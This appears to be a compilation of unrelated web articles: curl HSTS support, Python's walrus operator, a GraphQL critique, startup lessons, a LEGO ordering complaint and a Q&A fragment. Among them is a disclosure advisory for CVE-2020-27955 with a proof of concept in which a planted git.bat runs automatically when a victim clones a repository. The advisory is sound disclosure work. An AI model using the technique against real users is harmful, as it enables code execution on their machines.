<p>The idea is of course to reduce the risk for man-in-the-middle attacks when the server resources might be accessible via both HTTP and HTTPS, perhaps due to legacy or just as an upgrade path. Every access to the HTTP version is then a risk that you get back tampered content.</p>



<h2>Browsers preload</h2>



<p>These headers have been supported by the popular browsers for years already, and they also have a system setup for <em>preloading</em> a set of sites. Sites that exist in their <a href="https://hstspreload.org/">preload list</a> then never get accessed over HTTP since they know of their HSTS state already when the browser is fired up for the first time.</p>



<p>The entire <code>.dev</code> top-level domain is even in that preload list so you can in fact never access a web site on that top-level domain over HTTP with the major browsers.</p>



<h2>With the curl tool</h2>



<p>Starting in curl 7.74.0, curl has <em>experimental</em> support for HSTS. Experimental means it isn’t enabled by default and we discourage use of it in production. (Scheduled to be released in December 2020.)</p>



<p>You instruct curl to understand HSTS and to load/save a cache with HSTS information using <code>--hsts &lt;filename&gt;</code>. The HSTS cache saved into that file is then updated on exit and if you do repeated invokes with the same cache file, it will effectively avoid clear text HTTP accesses for as long as the HSTS headers tell it.</p>



<p>I envision that users will simply use a small hsts cache file for specific use cases rather than anyone ever really want to have or use a “complete” preload list of domains such as the one the browsers use, as that’s a <em>huge</em> list of sites and for most use cases just completely unnecessary to load and handle.</p>



<h2>With libcurl</h2>



<p>Possibly, this feature is more useful and appreciated by applications that use libcurl for HTTP(S) transfers. With libcurl the application can set a file name to use for loading and saving the cache but it also gets some added options for more flexibility and powers. Here’s a quick overview:</p>



<p><a href="https://curl.haxx.se/libcurl/c/CURLOPT_HSTS.html">CURLOPT_HSTS</a> – lets you set a file name to read/write the HSTS cache from/to.</p>



<p><a href="https://curl.haxx.se/libcurl/c/CURLOPT_HSTS_CTRL.html">CURLOPT_HSTS_CTRL</a> – enable HSTS functionality for this transfer</p>



<p><a href="https://curl.haxx.se/libcurl/c/CURLOPT_HSTSREADFUNCTION.html">CURLOPT_HSTSREADFUNCTION</a> – this callback gets called by libcurl when it is about  to start a transfer and lets the application preload HSTS entries – as if they had been read over the wire and been added to the cache.</p>



<p><a href="https://curl.haxx.se/libcurl/c/CURLOPT_HSTSWRITEFUNCTION.html">CURLOPT_HSTSWRITEFUNCTION</a> – this callback gets called repeatedly when libcurl flushes its in-memory cache and allows the application to save the cache somewhere and similar things.</p>



<h2>Feedback?</h2>



<p>I trust you understand that I’m very very keen on getting feedback on how this works, on the API and your use cases. Both negative and positive. Whatever your thoughts are really!</p>

November 5, 2020 | https://renanmf.com/walrus-operator-python/ | <a href="https://web.archive.org/web/*/https://renanmf.com/walrus-operator-python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The Walrus operator <code>:=</code> is an <a href="https://renanmf.com/assignment-operators-python/">assignment operator</a> and is available since Python 3.8.</p><p>It is called "walrus operator" due to its resemblance to the eyes and tusks of a walrus.</p><p>The walrus operator <strong>assigns and returns a value</strong> at the same time.</p><h2>Basic Example</h2><p>The regular way of asking for a piece of information in a terminal by using the <a href="https://renanmf.com/user-input-command-line-python/">input command</a> is as follows:</p><pre><code>&gt;&gt;&gt; age = input('How old are you? ')
How old are you? 30
&gt;&gt;&gt; print(f"You are {age} years old")
You are 30 years old
&gt;&gt;&gt; print(age)
30</code></pre><p>Using the walrus operator, you can make this code even shorter:</p><pre><code>&gt;&gt;&gt; print(f"You are {(age := input('How old are you? '))} years old")
How old are you? 30
You are 30 years old
&gt;&gt;&gt; print(age)
30</code></pre><h2>Example with a <code>while</code> loop</h2><p>Another example using <a href="https://renanmf.com/while-loops-python/">while loops</a> shows how you can simplify the code.</p><p>In this snippet, the loop will keep going until the user inputs the number 4.</p><pre><code>while True:
    number = int(input("Pick a number: "))
    if number == 4:
        break
    print(f'{number} squared is {number**2}')</code></pre><p>To have the same effect with the walrus operator, you do the following.</p><pre><code>while (number := int(input("Pick a number: "))) != 4:
    print(f'{number} squared is {number**2}')</code></pre><p>A simple test case for the while loop examples above is:</p><pre><code>Pick a number: 3
3 squared is 9
Pick a number: 5
5 squared is 25
Pick a number: 4</code></pre><h2>Example with a Regular Expression</h2><p>A simple example checking if the letter "Y" exists in "New York".</p><p>In the regular way to do it, we first get the result of the <code>search()</code> function, if there is no match, the function returns None which equals to <code>False</code> in the <code>if</code> statement.</p><p>If there is a match, the <code>res</code> variable will store a match object and pass the <code>if</code> statement.</p><pre><code>import re
text = "New York"
res = re.search("Y", text)
if res:
    print(res.group(0))</code></pre><p>To achieve the same result with the walrus operator, we can assign the result of the <code>search()</code> function directly to <code>res</code> in the <code>if</code> statement expression:</p><pre><code>import re
text = "New York"
if (res := re.search("Y", text)):
    print(res.group(0))</code></pre><h2>Example with a List Comprehension</h2><p>The use of the walrus operator with <a href="https://renanmf.com/list-comprehensions-in-python/">list comprehensions</a> enables the sharing of a subexpression.</p><p>In this case, without the walrus operator, we have to compute the operation <code>n**3</code> twice because we only want numbers whose cube is greater than 10.</p><pre><code>numbers = [1, 2, 3, 4, 5]
new_list = []
new_list = [n**3 for n in numbers if n**3 &gt; 10]
print(new_list)</code></pre><p>Using the walrus operator we can save this extra computation and reuse the value of <code>y</code> assigned in the <code>if</code> statement.</p><pre><code>numbers = [1, 2, 3, 4, 5]
new_list = []
new_list = [y for n in numbers if (y := n**3) &gt; 10]
print(new_list)</code></pre><p>Both will result in the same output, but the walrus operator allows a less expensive computation:</p><pre><code>[27, 64, 125]</code></pre><p>The code with the walrus operator might seem harder to read for some at first, use it only if it makes sense to you, and if it makes the code better overall.</p><h2>Controversy</h2><p>The Walrus Operator was controversial in the community and many people criticized it for some reasons:</p><ul><li>How will developers even use it?</li><li>Is this extra complexity needed?</li><li>This is confusing for new users of the language.</li></ul><p>These were the words that Guido van Rossum, the creator of Python,&nbsp;wrote after finishing PEP 572, which gave birth to the so-called Walrus Operator, saying he was resigning&nbsp;from his role.</p><blockquote><p>Now that PEP 572 is done, I don’t ever want to have to fight so hard for a PEP and find that so many people despise my decisions.</p><p>I would like to remove myself entirely from the decision process. I’ll still be there for a while as an ordinary core dev, and I’ll still be available to mentor people — possibly more available. But I’m basically giving myself a permanent vacation from being BDFL, and you all will be on your own.</p><p>After all that’s eventually going to happen regardless — there’s still that bus lurking around the corner, and I’m not getting younger… (I’ll spare you the list of medical issues.)</p><p>I am not going to appoint a successor.</p><p>So what are you all going to do? Create a democracy? Anarchy? A<br> dictatorship? A federation?</p><p>I’m not worried about the day to day decisions in the issue tracker or on GitHub. Very rarely I get asked for an opinion, and usually it’s not actually important. So this can just be dealt with as it has always been.</p><p>The decisions that most matter are probably</p><ul><li>How are PEPs decided</li><li>How are new core devs inducted</li></ul><p>We may be able to write up processes for these things as PEPs (maybe those PEPs will form a kind of constitution). But here’s the catch. I’m going to try and let you all (the current committers) figure it out for yourselves.</p><p>Note that there’s still the CoC — if you don’t like that document your only option might be to leave this group voluntarily. Perhaps there are issues to decide like when should someone be kicked out (this could be banning people from python-dev or python-ideas too, since those are also covered by the CoC).</p><p>Finally. A reminder that the archives of this list are public (<a href="https://mail.python.org/pipermail/python-committers/">https://mail.python.org/pipermail/python-committers/</a>) although membership is closed (limited to core devs).</p><p>I’ll still be here, but I’m trying to let you all figure something out for yourselves. I’m tired, and need a very long break.</p></blockquote><p>Personally speaking, as shown in the examples in this article, the walrus operator can be quite useful and help with some performant operations.</p><p>This is to show how even in the open source community, with highly smart people, there are disagreements that go beyond the professional level and get personal.</p><p>Projects are hard, designing programming languages is hard and we should thank those who take their time to build the tools we use every day to create awesome things.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>I think GraphQL will change the world. There will be a future where you can query any system in the world using GraphQL. I'm building this future. So why would I argue against using GraphQL? My personal pet peeve is when the community keeps advertising benefits of GraphQL that are very generic and really have nothing to do with GraphQL. If we want to drive adoption, we should be honest and take off the rose-tinted glasses. This post is a response to "Why use GraphQL" by Kyle Schrade (<a href="https://www.apollographql.com/blog/why-use-graphql/" target="_blank" rel="noopener noreferrer">https://www.apollographql.com/blog/why-use-graphql/</a>). It’s not meant to be direct criticism. The article is just an excellent base to work with as it represents opinions I keep hearing a lot in the community. If you read the whole article, it’ll take some time, you’ll fully understand why I think Kyle’s article should be named “Why use Apollo”.</p><p>If you haven't read Kyles's article already, I think it makes most sense if you read it first: <a href="https://www.apollographql.com/blog/why-use-graphql/" target="_blank" rel="noopener noreferrer">https://www.apollographql.com/blog/why-use-graphql/</a></p><p>The author states that REST APIs come with a set of downsides and how GraphQL solves all of them:
Over-fetching
Multiple requests for multiple resources
Waterfall network requests on nested data
Each client need to know the location of each service</p><p>The first three issues could be solved by writing another REST API as a facade for a specific user interface. Take Next.JS as an example. Next lets you define APIs with a very lightweight syntax. Instead of making multiple requests from the client, you can wrap those calls into an API and make them server-side. Over and underfetching can be solved with this approach too, as you can manipulate the data before sending it back to the client. The pattern described is named "backend for frontend" (BFF). It's not limited to full stack frameworks like Next.JS. You can build a BFF for your mobile apps as well.</p><p>With the BFF pattern, the client itself doesn't have to know the location of each service. However, the developer who implements the BFF needs to understand the service landscape. Hopefully you have Open API Specifications for all your services, nicely presented in a developer portal. If that's the case, it should be easy to write a BFF.</p><p>With GraphQL, there still needs to be a developer who implements the resolvers. Implementing the resolvers is more or less the same task as building a BFF, the logic is very similar. So, what's the real difference?</p><p>The BFF is easier to implement as there's a lot more tooling available. E.g. if you use a framework like Next.JS in combination with swr hooks (stale while revalidate) you get automatic caching with Etags and cache invalidation out of the box. This reduces the amount of data sent between server and client. It's even less data than GraphQL, because you're not sending query payloads and the server responds with 304 (Not Modified) if the response is still valid. Additionally, you don't have to use a heavyweight client like Apollo. The library swr by Vercel is small and very easy to use. It comes with support for pagination, hooks, and helps to navigate back and forth very efficiently.</p><p>GraphQL has persisted queries but it comes with additional overhead to implement this. If you don't use a client like Relay, which persists Queries by default, you have to do it on your own or use some third party library to implement it. Compared to the BFF approach using e.g. Next.JS there's a lot more complexity involved in getting to the same results on the frontend. How would you implement Etags with GraphQL? How do you make your GraphQL server return 304 status codes if nothing changed? Don't you first have to turn all Queries into GET requests? If so, does your GraphQL client and server easily support this?</p><p>When it comes to user experience and ease of development, the BFF is the clear winner. Less data transfer between client and server. Easier to implement. Smaller client, less moving parts.</p><p>But there's a catch. You have to build a BFF for each individual frontend. If you have many of them this can be a lot of work. You have to maintain all the BFFs. You have to operate them. You have to secure them.</p><p>Wouldn't it be nice if you could have the benefits of both without making tradeoffs? This is exactly what WunderGraph is. A framework to build BFFs using GraphQL.</p><p>In the next paragraph, Kyle goes on with the problems involved with versioned APIs. He's absolutely right that having too many versions of an API makes it very hard to keep track of. He then concludes that in GraphQL, there's only one version of the graph and changes can be tracked in a schema registry, a paid feature of Apollo. For that reason you won’t have any problems with versioning, he says.</p><p>I have problems coming to the same conclusion. Just because GraphQL schemas don’t support versioning natively doesn’t mean the problem goes away. You get the same effect if you just don’t version your REST APIs. In fact, many experts say that you should always try to not introduce versions of an API if you don’t have to. That being said, what holds you off running two versions of your GraphQL schema? Not that I think this is a good idea but it's technically possible.</p><p>If having too many versions of your REST APIs is a problem in your organization, before throwing a new tool like GraphQL at the problem, maybe you should have a look at the organization first. What are the reasons for having so many versions? Maybe the change of a process or new team structures can help? GraphQL does absolutely nothing to solve your versioning problems. Instead I think it actually makes the situation worse.</p><p>Do you have to support mobile applications? You should be aware that shipping native apps takes time. You have to wait for app store approval and you can expect many of your users to never (or slowly) install the new version. What if you want to introduce a breaking change in this scenario without breaking a client? It's impossible. You have to introduce this change in a non-breaking way. It would be interesting to hear from Facebook how they avoided breaking clients.</p><p>Evolving your schema in the case of GraphQL would mean, you deprecate the old field and add a new one. New clients use the new field while you hope that the number of clients using the old field will get less and less. Hopefully, you have a system in place that forces your users to download a new version at some point in time. Otherwise, you might be forced to support the deprecated field indefinitely. If that's the case, the deprecation model of GraphQL doesn't help you at all.</p><p>With REST you could create a new endpoint or another version of an existing one. The problem is the same, the solution just looks a bit different.</p><p>To make it clear, if you cannot control your clients you really want some kind of versioning. If all you have is a single web application you won’t need this feature. But then again GraphQL might be overkill as well.</p><p>In this paragraph, the author states that RESTful APIs don't allow partial responses.</p><p>This is just wrong. Here's an example:</p><div><div><div tabindex="0"><div><p><span>GET /users?fields=results(gender,name)</span></p></div></div></div></div><p>What does the author actually mean? I'm pretty sure he's aware of partial responses. I guess what he's trying to say is that someone needs to implement partial responses. Actually, it looks very familiar to GraphQL as you're selecting subfields from a resource. With GraphQL we have this feature out of the box.</p><p>On the other hand, with the BFF approach, you don't need this. Just return exactly the data you need. Again, a full-stack framework like Next.JS makes it simpler to implement this, makes caching easier and gives you Etag based cache invalidation for free.</p><p>To sum this section up, GraphQL gives you exactly the data you need. Partial responses can achieve the same result. BFFs come with the additional cost of implementation and maintenance but have a better UX &amp; DX.</p><p>In this paragraph, Kyle addresses the issues of REST APIs not being strictly typed. He talks about the problems with APIs where it's not clear if you get an array of posts or something different and how query parameters complicate the situation. He also states that GraphQL, because of its strict type system, doesn't have this problem.</p><p>I think what Kyle is talking about is an organizational problem for which you need an organizational solution.</p><p>You have the kind of problems he describes, when you allow developers to deploy REST APIs without publishing Open API Specifications (OAS) or similar. With OAS all resources can be described very easily. OAS also allows you to describe OAuth2 flows and required scopes per endpoint. Additionally, you can describe the exact types and validation rules for query parameters, a feature that GraphQL is lacking.</p><p>Looking at GraphQL, there's no way to describe Authentication, Authorization and input validation. GraphQL is lacking these features because the inventors at Facebook solved this problem at a different layer. There was no need for them to add these features to GraphQL. You can add custom directives to your schema to achieve similar results like OAS but this would be a custom implementation which you have to maintain yourself.</p><p>You might be thinking that OAS doesn't guarantee the response of an API to be compliant with the specification. You would be right. But how does a GraphQL schema guarantee anything?</p><p>GraphQL introspection is the act of sending a specific GraphQL query to the server to get information about the GraphQL schema. The GraphQL server is free to answer with whatever types it wants to. If you send a Query, the server can answer with a response that doesn't adhere to the GraphQL schema from the introspection response. Take Apollo Federation as an example. You upload your schema into a schema registry and then, by error, deploy the wrong version of your GraphQL server. If you change the type of a field, the client might be confused.</p><p>When we talk about type safety in GraphQL, what we actually mean is that we trust in a GraphQL server to behave exactly as advertised by the introspection Query …</p></section></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><blockquote>DISCLOSURE: THIS POST MAY CONTAIN AFFILIATE LINKS, MEANING I GET A COMMISSION IF YOU DECIDE TO MAKE A PURCHASE THROUGH MY LINKS, AT NO COST TO YOU. PLEASE READ MY <a href="https://www.alexhyett.com/affiliate-disclaimer">DISCLOSURE</a> FOR MORE INFO.</blockquote></div>
<p>At the start of 2018, I made the bold (or stupid) move to quit my job and try my hand at building a startup.</p>
<p>Before making this somewhat reckless move, I did my best to minimise risk. I cut my expenses as much as possible and did a lot of market research, including interviewing my target market before I even wrote a single line of code.</p>
<p>As a full stack developer, I knew I had the skills to build the product, so that wasn’t an issue. As they say build it and they will come. As I am sure you are aware, it is not that simple. My plan was to bootstrap this startup with no outside investment such as many are doing on <a href="https://www.indiehackers.com/">Indie Hackers</a>.</p>
<p>My brilliant, researched idea was to build a candidate relationship management tool that recruiters could use to help manage their candidate pipeline. A lot of the tools on the market were either very expensive or had UIs that looked like they were from the 90s. The market I was targeting was independent recruiters, who maybe couldn’t afford or need the features of the big tools on the market but still needed something simple to manage their recruitment pipeline.</p>
<p>The result was <a href="https://www.growrecruit.com/">GrowRecruit</a>, a simple CRM for recruiters with a great UI. As you can guess from the title of this article it failed to gain any traction and by 2019 I went back into full time employment.</p>
<p>These are the lessons I learned from my brief stint as a startup founder.</p>
<h2>1. Marketing, Marketing, Marketing … oh and a bit more Marketing!</h2>
<p>I am a software engineer at heart and as such the thought of doing sales really isn’t appealing. To me sales means sending pushy emails, cold calling prospects and generally pushing your product down peoples throats until you find someone to buy it.</p>
<p>The alternative to this stereotypical sales approach is to work on content marketing. By writing interesting articles, that are relevant to your target market, you can draw in customers without being a slimy salesmen. Throughout your articles you can mention your product and hopefully convert some of those readers into customers.</p>
<p>Content marketing does work, so why did it fail for me?</p>
<p>Quite simply, I didn’t know enough about my target market. As a software developer, I had certainly been on the receiving end of plenty of recruiter emails but I didn’t know enough about their pains or what they liked reading about. As such after 8 blog posts it became really hard to come with new posts to write!</p>
<p>If you don’t market your product then no one will know it exists and therefore you will get no customers.</p>
<blockquote>
<p>Market, Marketing, Aethsetic, Function <em><a href="https://geni.us/nOQfAA">- Rob Walling</a></em></p>
</blockquote>
<p>One of the best books I can recommend for software developers looking to start a startup is Rob Walling’s book <a href="https://geni.us/nOQfAA">Start Small, Stay Small: A Developer’s Guide to Launching a Startup</a> it has a lot of advice for fellow bootstrappers.</p>
<h2>2. Money is always an issue, even if you have plenty of savings</h2>
<p>Before I embarked on my entrepreneurial journey I made sure I had 2 years worth of savings saved up. Yes, 2 years! I was in this for the long haul or so I thought. I was able to do this by making sure that I cut out as many of my monthly expenses as possible before I handed in my notice at work. This allowed me to save as much as possible and extend how long those savings would last.</p>
<p>However, for someone who has a wife, 2 children and a mortgage to pay, there is a limit to how much you can bring down your costs. There will also always be unexpected costs that crop up that you just hadn’t anticipated that will eat away at your savings.</p>
<p>I went back to full time employment after 1 year but it wasn’t because I ran out of money. I actually didn’t spend much more than I had original budgeted for.</p>
<p>What I hadn’t anticipated were the psychological effects of having no income and seeing my bank balance decrease month on month, would have on my mental heath.</p>
<p>Not only was this incredibly stressful watching this money hourglass count down, it also affected my ability and willingness to work on new ideas.</p>
<p>There was always the thought in the back of my head wondering if what I was working on was going to bring in money quickly. I ended up not pursuing a few ideas, simply because I couldn’t guarantee it would pay off before the time ran out.</p>
<h2>3. Having a market is more important than marketing</h2>
<p>How well you market your product will make or break whether your startup will be successful. However, what is more important than marketing is having a market to sell to. I don’t mean just knowing where your target market can be found, I mean actually having a following who would be eager to buy your product.</p>
<p>Ideally this would be an email list or an engaged social media following. If you already have raving fans who trust you and consume your content then it is a lot easier to sell something to them then it is to sell to a complete stranger.</p>
<p>If you are planning on building a startup or product in the future work on building up your following now!</p>
<p>I great example of this is <a href="https://nathanbarry.com/">Nathan Barry</a>, who already had a successful blog and a few successes building apps and writing books. When he started <a href="https://convertkit.com/">ConvertKit</a> he already had a following and he built the startup in public and had fans ready to jump on his product as soon as the beta was out. ConvertKit now has monthly recurring revenue (MRR) of <a href="https://convertkit.baremetrics.com/">over $2M</a>.</p>
<h2>4. It is going to take longer than you think</h2>
<p>Businesses aren’t built in a day, a month or even a year unless you have a following already that you can sell to. It generally takes a lot longer than that. Generally a lot of startups take a couple of years before they become profitable.</p>
<p>Do you have the money and the stomach to sink 2 years into something before seeing any return on your time investment? Unfortunately there is no guarantee that your product will actually be successful no matter how many years you work on it.</p>
<p>Are you willing to put in 60 hour weeks to get your startup off the ground? I only spent 5 hours a day working on my startup so I could spend more time with my family. I don’t regret that but if you want to be successful you have to be willing to put in the work.</p>
<h2>5. Don’t get married to your idea</h2>
<p>This point is important. I already had an idea of what I wanted to build before I read any books or did any courses on building a startup. This was a bad idea. It is very difficult to let go of an idea if you already have one in your mind.</p>
<p>As such, when going through these courses and reading these books I felt like my idea already ticked all the boxes. This is what you call confirmation bias. You are married to your idea and no matter what surveys or tests you do, you still think your idea is good.</p>
<p>This is especially apparent when you get further into building and testing your product. Many startups end up pivoting their product based on feedback from their early customers (or lack of). If you are married to your idea, it can be difficult to pivot your product as you think what you have is already perfect.</p>
<p>Pat Flynn has a great book on this called <a href="https://geni.us/Q2TZ8s">Will It Fly?</a> that goes through the process of working out if your product has the chance for success before you go and marry it.</p>
<h2>6. Running a business is more than just building the product</h2>
<p>I really underestimated how much the other activities of running a business would take up. My product wasn’t bringing in any money but I had a limited company that was registered for VAT. As such I had to file quarterly VAT reports and make sure my accounts were correct and submitted to HMRC.</p>
<p>As I wasn’t earning anything, I couldn’t justify paying for an accountant to submit negative accounts for me. I had to learn how to do this myself which took up a lot of time.</p>
<p>On top of finances and building the product you also have marketing which takes up a lot of time.</p>
<h2>7. Beta users are not your customers</h2>
<p>The little bit of marketing I did for my product did bring in a quite a few beta users. However, it is important that you do not mistake these beta users for actual customers.</p>
<p>Beta users will likely come up with feature requests and other ideas for your product but unless multiple beta users are telling you the same thing, don’t go spending a week building what they have asked for. There is no guarantee that they will actually convert to paying customers even if you do deliver this must have feature.</p>
<p>Beta users are just that. They have signed up for your product because it is free, they aren’t your target market. A lot of my beta users used the product actively everyday but as soon as I put the paywall up (even with a beta user discount) they stopped using it.</p>
<h2>8. Are you really solving a problem?</h2>
<p>My target market was independent recruiters which appeared to be an underserved market given all the enterprise CRMs. They didn’t need anything expensive but still had the money to pay for a tool that would make their life easier.</p>
<p>One of the books I read said that if your market is having to rely on spreadsheets to get the job done that is a good indicator that you can build a product around that process.</p>
<p>As it turns out recruiters are perfectly happy using spreadsheets it seems. Especially when they aren’t looking at thousands of applicants it is probably easier just to store their details in Excel.</p>
<p>Make sure the problem you are solving is an actual problem, a real pain that others aren’t solving or are solving badly.</p>
<h2>9. Don’t worry about scale until you have a scaling problem</h2>
<p>As a software developer that has spent most of his career working on high traffic systems, I am always making sure that the code I write will cope with high load and any manual processes are automated.</p>
<p>However your bootstrapped startup in its early days isn’t going to have a scaling problem. Do you really need to spend time automating a manual process that so far you have done 0 times because you have no customers? Do you need to spend time optimising your SQL …</p></div></div>

- CVE-2020-27955
- Release date: 04.11.2020
- Revision 1.0
- Severity: Critical
=============================================


I. VULNERABILITY
-------------------------

Git &lt;= 2.29.2 - Remote Code Execution (RCE) via git-lfs


II. BACKGROUND
-------------------------


Git

"Git is a free and open source distributed version control system designed to 
handle everything from small to very large projects with speed and efficiency.

<a href="https://git-scm.com/">https://git-scm.com/</a>


--


Git LFS

"An open source Git extension for versioning large files

Git Large File Storage (LFS) replaces large files such as audio samples, 
videos, datasets, and graphics with text pointers inside Git, while 
storing the file contents on a remote server like GitHub.com or GitHub 
Enterprise."

<a href="https://git-lfs.github.com/">https://git-lfs.github.com/</a>



III. INTRODUCTION
-------------------------


Git in versions &lt;= 2.29.2 includes git-lfs extension which allows remote 
attackers to execute arbitrary code on the victim's Windows system upon a
clone operation.



IV. DESCRIPTION 
-------------------------


Due to the vulnerability in git-lfs described at:

<a href="https://legalhackers.com/advisories/Git-LFS-RCE-Exploit-CVE-2020-27955.html">
Git-LFS &lt;= 2.12 RCE Exploit
</a>


Attackers may be able to plant a backdoor in the root directory of a malicious 
repository by simply adding an executable file named as: 

- git.bat
- git.exe
- git.cmd 
- git.vbs

or any other executable extension available on the target Windows system 
(PATHEXT environment variable dependent).

As a result, the malicious git binary will get executed automatically
instead of the original git binary located in a trusted path.



V. PROOF OF CONCEPT
-------------------------


A git-lfs PoC exploit for git may be prepared with the following steps:



Attacker:

On a separate linux system (to prevent execution on the localhost on commit):


1. Create a new repository:

    mkdir git-lfs-RCE-exploit
    cd git-lfs-RCE-exploit
    git init


2. Prepare a malicious executable. E.g: git.bat with the following contents:

    @echo hacked &gt; GITHACKED


3. Add the executable to the repository:

    git add git.bat


4. Add LFS file entries to the repository. This is necessary to trigger 
the vulnerable git-lfs extension when the repository is cloned and processed
by the main git process.

    git lfs track "*.dat"
    git add .gitattributes

    echo "git exploit PoC" &gt; big-bug-lfs-file.dat
    git add big-bug-lfs-file.dat


5. Commit both the exploit and the lfs files:

    git commit -a -m "Big Data, powered by Git LFS &amp; the git-lfs exploit"
    

6. Push the changes to the repository:

    git remote add origin <a href="https://github.com/some-user-name/lfspoc">https://github.com/some-user-name/lfspoc</a>
    git push -u origin master



Victim:

On windows, run powershell.exe shell and clone the PoC repo:

    git clone <a href="https://github.com/some-user-name/lfspoc">https://github.com/some-user-name/lfspoc</a> .

At this point the malicious executable (git.bat) will be downloaded into the repo's directory
and automatically executed by the git-lfs extension without any user interaction. 


As a result, 'GITHACKED' file should appear in the repo's directory 
To check, type:

    dir 




Alternatively, a demo repository with a plain-text bat file located at
<a href="https://github.com/ExploitBox/git-lfs-RCE-exploit-CVE-2020-27955.git">https://github.com/ExploitBox/git-lfs-RCE-exploit-CVE-2020-27955.git</a>
can be used as follows:

C:\Users\victim&gt; git clone <a href="https://github.com/ExploitBox/git-lfs-RCE-exploit-CVE-2020-27955.git">https://github.com/ExploitBox/git-lfs-RCE-exploit-CVE-2020-27955.git</a> .

VI. BUSINESS IMPACT
-------------------------

The vulnerability can lead to a full compromise of the victim's system as
attackers can execute arbitrary commands remotely without the knowledge of the
victim. 

Due to the critical severity, affected users and product vendors should update 
to the latest git-lfs version as soon as possible as the vulnerability is
trivial to exploit.

 
VII. SYSTEMS AFFECTED
-------------------------

Git &lt;= 2.29.2 on Windows systems (Windows Server 2019, Windows 10
 Pro etc.) with a default installation of git Windows package which 
has git-lfs extension in versions &lt;= 2.12 installed.


VIII. SOLUTION
-------------------------

This Remote Code Execution vulnerability was reported to git-lfs vendor who 
issued a patched release on the official website linked below. 

Alternatively, the latest git release which contains the patched version of 
git-lfs may be installed instead.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><div><h2 id="because-they-probably-wont">…because they probably won’t</h2><p>I recently watched a few videos on YouTube about the latest and greatest LEGO sets. I didn’t do it because I’m super interested in LEGO (that was a while ago) but because the YouTube algorithm decided that I had to. I naturally obeyed. The results were as expected: I felt old and none of those sets triggered any kind of “I need to have this” response. Until I saw this:</p><p><img src="https://www.krewast.de/img/artikel-lego-tree-house.jpg" alt="Lego Tree House"></p><p>This beautiful tree house immediately sparked my interest. It’s cute, it’s not one of those boring license sets (Star Wars, Harry Potter, Minecraft, …), the price to number of LEGO pieces ratio is okay (still super expensive!) and it would fit nicely between my house plants which I foster - and sometimes kill - in my living room.</p><p>So, I did something I usually never do: I made an impulse buy. I put the 195&nbsp;€ tree house into the shopping cart, created a LEGO user account, entered all my data, chose “Invoice” as payment method and clicked “Buy”. I received the automatic “Thank you for your purchase” e-mail and felt happy.</p><h2 id="we-are-sorry">We are sorry</h2><p>On the next day I received another e-mail. This time from the LEGO customer service. You can find the original German version at the end of this post, here is a short translation of the important part:</p><blockquote>Dear Bastian Kres,<p>thank you for ordering your LEGO® toy directly from us.</p><p>Unfortunately, the total amount of your order exceeds the credit limit for payment on account and by direct debit. Therefore, we are not able to send this order yet.</p><p>Please call us to pay by VISA or MasterCard. […]</p></blockquote><p>Well, here’s the thing: LEGO knew that I was a first time customer and they also knew that the total amount of my order was about 195 €. If they didn’t want me to pay on account, why did they offer me the option?</p><h2 id="how-to-kill-enthusiasm">How to kill enthusiasm</h2><p>1.) I would like to mention that wouldn’t have had a problem to pay in advance. PayPal or credit card are good options which I use all the time. But by sending me this e-mail after I already selected my preferred payment method and ordered the thing, LEGO basically tells me that I cannot be trusted. And at the same time they want me to trust them…</p><p>2.) As I wrote before, this purchase was an impulse buy. The tree house is something I wanted. But after receiving this e-mail I had lot of time to think about whether or not I still do? Especially because I could buy a huge amount of real plants for 195&nbsp;€. That would be good for nature, but bad for LEGO.</p><p>3.) By postponing the delivery until after I paid, they also created a whole new experience for me. Now I don’t have the tree house in my hands, see how nice it is and pay happily. No, now I have this bitter taste in my mouth and a decision to make. Should I really be making decisions after I already ordered something?</p><h2 id="some-lessons-for-online-stores">Some lessons for online stores</h2><p>As a web developer I always find it interesting to see how even very big companies still make mistakes like this. But the good thing is: We can learn from them!</p><ul><li>Make it easy for customers to order from you, avoid any friction or inconveniences</li><li>Offer customers a broad set of payment options, omit those you deem too risky</li><li>Don’t send customers “We don’t trust you” messages after they already ordered something from you. It totally kills their enthusiasm</li></ul><p>And that’s it.</p><p>One last question remains: Did LEGO dodge a bullet because I would have sent the tree house back anyway? Maybe, but probably not. I rarely send anything back for two reasons: It’s an effort and I’m generally lazy ;)</p><p>If any of this sound snarky: I’m sorry, that was never my intention. I just found it interesting (and wanted to share) how LEGO decided to set up this process, what consequences it can have and how I probably won’t get a new toy but at least ten new house plants.</p><hr><p>Obligatory link to <a href="https://www.youtube.com/channel/UC_EZd3lsmxudu3IQzpTzOgw" target="_blank" rel="nofollow noopener">Held der Steine</a> and his <a href="https://www.youtube.com/watch?v=nIQJV2o6EPY" target="_blank" rel="nofollow noopener">LEGO Tree House</a> video.</p><h2 id="the-original-german-e-mail">The original German e-mail</h2><blockquote>Guten Tag Bastian Kres,<p>vielen Dank, dass Sie Ihr LEGO® Spielzeug direkt bei uns bestellt haben.</p><p>Leider überschreitet die Gesamtsumme Ihrer Bestellung die Kreditgrenze für Zahlung auf Rechnung und per Lastschriftverfahren.

Republished by Stripe Press in 2018, it soon became a must-read inside Silicon Valley, particularly among those astonished at how they themselves had become the central story to the central challenges in the West. This spy from the Beltway made a victory lap in Silicon Valley, where I met him at a book launch dinner. Aside from the usual Cuban-exile plotting, we’ve been kibbitzing about tech and media ever since.</strong></p><p><strong>This Q&amp;A was conducted over email, and Gurri’s answers are unedited.</strong></p><div><p><strong>'<a href="https://amzn.to/2Fp9Av6">Revolt of the Public</a>' is an obvious play on <a href="https://plato.stanford.edu/entries/gasset/">Ortega y Gassett's</a> <a href="https://www.thedailybeast.com/the-smartest-book-about-our-digital-age-was-published-in-1929">'Revolt of the Masses' </a>(which I think you credit). In a sense, it's an updated version of Ortega's book, but this time the 'mass man' has smartphones and an even bigger entitlement chip on their shoulder. <p>That said, I find the eponymous reference here to be Lasch's <a href="https://en.wikipedia.org/wiki/Christopher_Lasch#The_Revolt_of_the_Elites:_And_the_Betrayal_of_Democracy">'The Revolt of the Elites'</a>. Your book seems a closing parenthetical bookend to that classic work. To very briefly summarize, Lasch predicted that the formerly aristocratic WASP elites, who considered the US their personal political project which they took on with a considerable sense of duty and noblesse oblige, would be replaced by a grasping and transactional neoliberal elite utterly indifferent to the plight of those outside the new economic order. In short, he predicted the Whole Foods-buying, Zoom-using class that we now take for granted, but who at the time were still an odd bird. 